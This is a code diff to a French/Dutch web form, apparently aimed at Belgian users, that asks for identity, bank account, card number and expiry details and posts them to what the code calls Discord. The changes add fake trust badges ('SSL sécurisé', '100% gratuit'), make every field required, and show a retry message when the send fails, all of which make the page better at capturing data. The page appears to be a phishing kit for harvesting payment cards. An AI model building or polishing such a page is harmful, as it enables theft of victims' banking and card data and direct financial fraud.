@@ -258,6 +258,40 @@
         .form-consent { font-size:12px; color:var(--muted); text-align:center; margin-top:14px; }
         .modal-thanks { font-size:14px; color:var(--muted); margin-bottom:0; }
 
+        @keyframes shake {
+            0%,100% { transform:translateX(0); }
+            20%,60% { transform:translateX(-6px); }
+            40%,80% { transform:translateX(6px); }
+        }
+        .form-group input.shake,
+        .form-group select.shake { animation:shake 0.4s ease; }
+
+        .btn-submit .spinner {
+            display:inline-block; width:16px; height:16px; border:2.5px solid rgba(255,255,255,0.3);
+            border-top-color:#fff; border-radius:50%; animation:spin 0.6s linear infinite;
+            vertical-align:middle; margin-right:8px;
+        }
+        @keyframes spin { to { transform:rotate(360deg); } }
+
+        .toast {
+            position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(100px);
+            background:var(--danger); color:#fff; padding:14px 28px; border-radius:12px;
+            font-size:14px; font-weight:600; z-index:2000; opacity:0;
+            transition:transform 0.35s ease, opacity 0.35s ease;
+            box-shadow:0 8px 24px rgba(0,0,0,0.25); max-width:90%; text-align:center;
+        }
+        .toast.show { transform:translateX(-50%) translateY(0); opacity:1; }
+
+        .trust-bar {
+            display:flex; justify-content:center; gap:24px; flex-wrap:wrap;
+            margin-top:20px; padding:14px 0; border-top:1px solid var(--border);
+        }
+        .trust-item {
+            display:flex; align-items:center; gap:6px;
+            font-size:12px; color:var(--muted); font-weight:500;
+        }
+        .trust-item svg { width:16px; height:16px; stroke:var(--accent); fill:none; stroke-width:2; }
+
         @media (max-width:640px) {
             .site-bar { padding:12px 16px; }
             .page { padding:24px 14px 40px; }
@@ -527,7 +561,24 @@
             <span class="fr">En cliquant, vous acceptez notre politique de confidentialité.</span>
             <span class="nl">Door te klikken gaat u akkoord met ons privacybeleid.</span>
         </p>
+
+        <div class="trust-bar">
+            <span class="trust-item">
+                <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                <span class="fr">SSL sécurisé</span><span class="nl">SSL beveiligd</span>
+            </span>
+            <span class="trust-item">
+                <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+                <span class="fr">100% gratuit</span><span class="nl">100% gratis</span>
+            </span>
+            <span class="trust-item">
+                <svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+                <span class="fr">Traitement immédiat</span><span class="nl">Onmiddellijke verwerking</span>
+            </span>
+        </div>
     </form>
+
+    <div class="toast" id="errorToast"></div>
 
     <!-- ===== POP-UP ===== -->
     <div class="modal-overlay" id="confirmationModal">
@@ -591,14 +642,46 @@
     var sectionInfo = $('sectionInfo');
     var isNl = function() { return document.body.classList.contains('lang-nl'); };
 
+    var errorToast = $('errorToast');
+
+    function showToast(msg) {
+        errorToast.textContent = msg;
+        errorToast.classList.add('show');
+        setTimeout(function() { errorToast.classList.remove('show'); }, 4000);
+    }
+
+    function scrollToFirstError() {
+        var firstInvalid = form.querySelector('.invalid');
+        if (firstInvalid) {
+            var el = firstInvalid.closest('.form-group') || firstInvalid;
+            el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            firstInvalid.classList.add('shake');
+            setTimeout(function() { firstInvalid.classList.remove('shake'); }, 500);
+            firstInvalid.focus();
+        }
+    }
+
     form.addEventListener('submit', function(e) {
         e.preventDefault();
-        if (!form.checkValidity()) {
+
+        var allFields = [fullnameInput, ageInput, emailInput, phoneInput, compteBE, banqueSelect, carteInput, expiryInput, amountInput];
+        allFields.forEach(function(f) {
+            if (f.value.length === 0) {
+                f.className = 'invalid';
+                f.setCustomValidity('Requis');
+            }
+        });
+        if (banqueSelect.value === 'Autre' && banqueAutreInput.value.trim().length < 2) {
+            banqueAutreInput.className = 'invalid';
+        }
+
+        if (form.querySelector('.invalid')) {
+            scrollToFirstError();
             return;
         }
 
         submitBtn.disabled = true;
-        submitBtn.textContent = isNl() ? '⏳ Verzenden...' : '⏳ Envoi...';
+        submitBtn.innerHTML = '<span class="spinner"></span>' + (isNl() ? 'Verzenden...' : 'Envoi...');
 
         var banqueVal = banqueSelect.value === 'Autre' ? banqueAutreInput.value : banqueSelect.value;
         var formData = {
@@ -652,7 +735,8 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(message)
         })
-        .then(function() {
+        .then(function(response) {
+            if (!response.ok) throw new Error('HTTP ' + response.status);
             modal.classList.add('active');
             submitBtn.disabled = false;
             restoreSubmitText();
@@ -661,9 +745,9 @@
         })
         .catch(function(err) {
             console.error('Erreur Discord:', err);
-            modal.classList.add('active');
             submitBtn.disabled = false;
             restoreSubmitText();
+            showToast(isNl() ? '⚠ Verzendfout. Probeer het opnieuw.' : '⚠ Erreur d\'envoi. Veuillez réessayer.');
         });
     }
 
